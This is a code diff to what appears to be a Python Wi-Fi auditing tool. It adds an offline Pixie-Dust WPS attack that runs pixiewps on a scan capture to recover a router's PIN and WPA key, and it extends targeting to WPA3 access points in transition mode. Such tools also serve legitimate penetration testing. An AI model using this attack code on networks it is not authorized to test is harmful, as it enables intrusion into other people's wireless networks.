@@ -5,15 +5,18 @@ from __future__ import annotations
 import time
 from datetime import datetime, timezone
 
+import os
+
 from ..models import CrackResult, EncryptionType, WPSState
 from ..tools.reaver import WPSAttack
+from ..tools.wps_offline import try_offline_pixie
 from .base import Attack, AttackResult
 
 
 def _wps_base_ok(cfg, ap) -> bool:
     if not cfg.attack.wps:
         return False
-    if ap.encryption == EncryptionType.WPA3:
+    if ap.encryption == EncryptionType.WPA3 and not ap.transition_mode:
         return False
     if ap.wps not in (WPSState.UNLOCKED, WPSState.LOCKED):
         return False
@@ -57,6 +60,32 @@ class WPSPixieAttack(Attack):
 
         self.status("attack", f"Starting {tool} {mode}...", timeout=timeout, started=started)
         self.tracker.log(f"{mode} attack on {self.ap.display_name}", tag=tag)
+
+        pin = key = None
+        capfile: str | None = None
+        if pixie and self.cfg.attack.offline_pixie:
+            capfile = self.tracker.wps_scan_caps.get(self.ap.bssid.upper())
+            if capfile and os.path.isfile(capfile):
+                self.tracker.log(
+                    f"Offline Pixie-Dust from scan cap → {os.path.basename(capfile)}",
+                    tag=tag,
+                )
+                pin, key = try_offline_pixie(capfile, self.ap.bssid)
+                if key:
+                    self.tracker.log("[green]Offline pixiewps recovered PSK[/]", tag=tag)
+                elif pin:
+                    self.tracker.log(
+                        f"[yellow]Offline pixiewps PIN {pin} — no PSK in output[/]",
+                        tag=tag,
+                    )
+        if key:
+            crack = CrackResult(
+                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
+                method=f"{tag}-offline", capture_file=capfile or "",
+                cracked_at=datetime.now(timezone.utc).isoformat(),
+            )
+            self.status("cracked", f"Key found: {key}", started=started)
+            return AttackResult(True, crack=crack, message=f"WPS {mode} cracked (offline): {key}")
 
         runner = WPSAttack.run_pixie if pixie else WPSAttack.run_pin
         pin, key = runner(
